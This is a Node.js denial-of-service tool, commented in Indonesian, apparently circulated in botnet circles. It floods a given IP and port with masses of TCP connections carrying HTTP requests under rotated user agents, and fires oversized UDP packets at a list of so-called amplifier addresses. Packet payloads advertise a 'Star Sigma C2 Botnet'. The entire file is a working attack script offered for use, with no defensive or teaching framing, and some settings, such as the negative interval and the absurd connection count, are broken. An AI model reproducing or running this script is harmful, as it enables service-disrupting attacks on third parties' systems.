const net = require("net");
const dgram = require("dgram");
const fs = require("fs");

if (process.argv.length < 5) {
    console.log("Usage: node script.js <IP_TARGET> <PORT_TARGET> <TIME>");
    process.exit(1);
}

const targetIp = process.argv[2];
const targetPort = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]) * 1000;
const startTime = Date.now();

const threads = 2000; // Jangan Di Ubah Ya Kawan²
const connectionsPerThread = 4294967295; // Jangan Di Ubah Ya Kawan²
const interval = -1; // Jangan Di Ubah Ya Kawan²

// Load User-Agent dari ua.txt
let userAgents = [];
if (fs.existsSync("ua.txt")) {
    userAgents = fs.readFileSync("ua.txt", "utf8")
        .split("\n")
        .map(ua => ua.trim())
        .filter(ua => ua.length > 0);
}

// Load Proxy dari socks5.txt
let proxies = [];
if (fs.existsSync("Soks.txt")) {
    proxies = fs.readFileSync("Soks.txt", "utf8") //proksi lu, kalo namanya bukan ini ganti aja
        .split("\n")
        .map(proxy => proxy.trim())
        .filter(proxy => proxy.length > 0);
}

// Amp, Jangan Di Ubah!
let amplifiers = [];
if (fs.existsSync("amplifiers.txt")) {
    amplifiers = fs.readFileSync("amplifiers.txt", "utf8")
        .split("\n")
        .map(ip => ip.trim())
        .filter(ip => ip.length > 0);
}

if (userAgents.length === 0 || proxies.length === 0 || amplifiers.length === 0) {
    console.log("❌ Pastikan ua.txt, Soks.txt, dan amplifiers.txt tidak kosong!");
    process.exit(1);
}

console.log(`🔥 Starting Hybrid Attack (TCP + UDP AMP)`);
console.log(`🚀 Target: ${targetIp}:${targetPort} | Duration: ${process.argv[4]}s`);
console.log(`📂 Loaded ${userAgents.length} User-Agents, ${proxies.length} Proxies, ${amplifiers.length} Amplifiers`);

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
}

function attackTCP() {
    let connections = [];

    function createSocket() {
        if (Date.now() - startTime > duration) {
            connections.forEach(socket => socket.destroy());
            console.log(`⏹️ Attack stopped.`);
            process.exit(0);
        }

        const socket = new net.Socket();
        const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
        const request = `GET / HTTP/1.1\r\nHost: ${targetIp}\r\nUser-Agent: ${randomUA}\r\n\r\n`;

        socket.connect(targetPort, targetIp, () => {
            socket.write(request);
        });

        socket.on("error", () => {
            socket.destroy();
            process.nextTick(createSocket);
        });

        connections.push(socket);
    }

    for (let i = 0; i < connectionsPerThread; i++) {
        createSocket();
    }

    setInterval(() => {
        shuffle(connections);
        connections.forEach(socket => {
            if (!socket.destroyed) {
                socket.write("管理员迪克, 英文縮寫Hello Sir, Star Sigma C2 Botnet In Here!!!英文縮寫, 管理员迪克");
            }
        });
    }, interval);
}

function attackUDP() {
    const socket = dgram.createSocket("udp4");
    const packet = Buffer.alloc(65500, "管理员迪克,管理员迪克 UDP AMP BYPASS, 英文縮寫Hello Sir, Star Sigma C2 Botnet In Here!!!英文縮寫");

    function sendPackets() {
        if (Date.now() - startTime > duration) {
            socket.close();
            return;
        }

        amplifiers.forEach(ampIP => {
            socket.send(packet, 0, packet.length, targetPort, ampIP, () => {});
        });

        setTimeout(sendPackets, 100);
    }

    sendPackets();
}

// Jalankan TCP dan UDP Attack bersamaan
for (let i = 0; i < threads; i++) {
    attackTCP();
    attackUDP();
}